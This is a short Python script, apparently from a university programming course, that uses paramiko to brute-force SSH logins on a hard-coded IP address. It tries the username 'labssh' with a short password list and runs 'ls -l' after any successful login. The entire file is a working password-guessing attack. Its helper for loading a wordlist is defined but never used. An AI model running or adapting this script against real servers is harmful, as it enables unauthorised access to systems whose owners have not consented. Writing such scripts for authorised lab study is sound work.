import paramiko

#ruta_dic = "D:/Universidad_Axel/Cuatrimestres/Quinto_Cuatrimestre/Programacion_Avanzada/diccionario_pass.txt"

host = "74.179.81.132"
usuario = "labssh"

def cargar_passwords_desde_archivo(ruta_archivo):
    try:
        with open(ruta_archivo, "r") as archivo:
            passwords = archivo.readlines()
            if not passwords:
                print(f"El archivo '{ruta_archivo}' está vacío.")
                exit(1)
            return passwords
    except FileNotFoundError:
        print(f"El archivo '{ruta_archivo}' no fue encontrado.")
        exit(1)
        
        
def fuerza_bruta_ssh(host):
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    lista_claves = ["progra123","labprogra123","progralab123"]
    clave_correcta = ""

    for clave in lista_claves:
        try:
            print(f"intentado con: {clave}")
            cliente.connect(host, port=22, username="labssh", password=clave, look_for_keys=False, allow_agent=False)
            stdin, stdout, stderr = cliente.exec_command("ls -l")
            #stdin, stdout, stderr = cliente.exec_command("echo OK")
            print(stdout.read().decode())
        except paramiko.AuthenticationException:
            print(f"Password '{clave}' falló.")
        except Exception as e:
            print(f"Error: {e}")
            break

    cliente.close()

if __name__ == "__main__":
    fuerza_bruta_ssh(host)
